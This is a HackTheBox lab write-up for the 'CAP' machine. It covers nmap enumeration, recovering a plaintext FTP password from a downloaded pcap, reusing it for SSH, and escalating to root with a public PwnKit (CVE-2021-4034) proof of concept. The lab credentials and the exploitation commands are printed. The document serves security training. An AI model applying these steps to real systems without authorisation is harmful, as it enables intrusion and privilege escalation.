# CAP - HackTheBox Writeup (2025-04-07)

> ⚠️ **Disclaimer**
>
> This report documents a security assessment performed on a publicly available vulnerable machine within the HackTheBox platform.
> All activities were conducted legally and within the authorized scope of HackTheBox Labs.
>
> This report is shared strictly for educational and ethical purposes only.


## Target Overview

- **Machine Name:** CAP
- **IP Address:** 10.10.10.245
- **Platform:** HackTheBox
- **Difficulty:** Easy
- **Objective:** Gain root access and capture flags


## Enumeration

### 🔎 Nmap Scan
```bash
nmap -sC -sV -p- -oN cap_nmap.txt 10.10.10.245
```

**Open Ports:**
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
```

- Port 80 hosted a “Security Dashboard” with limited functionality.
- Discovered `/data/0` and `/data/3` endpoints via directory fuzzing and manual inspection.
- Downloaded a `.pcap` file from `/data/3`.


## Initial Foothold

### 📦 Credential Extraction from PCAP
- Inspected `login.pcap` with Wireshark.
- Captured a plaintext FTP login:
  ```
  USER nathan
  PASS Buck3tH4TF0RM3!
  ```

- Credentials worked for **SSH login**:
  ```bash
  ssh nathan@10.10.10.245
  ```

- Flag #1: User flag located at:
  ```bash
  cat ~/user.txt
  ```

- Nathan is **not** a sudoer (`sudo -l` returned permission denied).


## Privilege Escalation

### 🚀 PrivEsc via CVE-2021-4034 (PwnKit)
- Found `/usr/bin/pkexec` with SUID bit set.
- Checked version:
  ```bash
  pkexec --version
  → 0.105
  ```

- Confirmed vulnerable to **PwnKit** exploit.

### ✅ Exploitation Steps:
- Downloaded PoC exploit from:
  `https://github.com/berdav/CVE-2021-4034`
- Compiled the shared object:
  ```bash
  make
  ```
- Executed exploit:
  ```bash
  ./cve-2021-4034
  whoami → root
  ```

- Flag #2: Root flag located at:
  ```bash
  cat /root/root.txt
  ```


## Conclusion

Successfully compromised CAP via:
- PCAP file analysis and credential reuse
- Abuse of vulnerable `pkexec` binary (PwnKit)

**Tools Used:** Nmap, Gobuster, Wireshark, gcc, Git, CVE-2021-4034 exploit

**Lessons Learned:**
- Traffic captures can leak real credentials.
- Always verify local binaries with SUID for known vulns.
- Privilege escalation is often one small misconfig away.

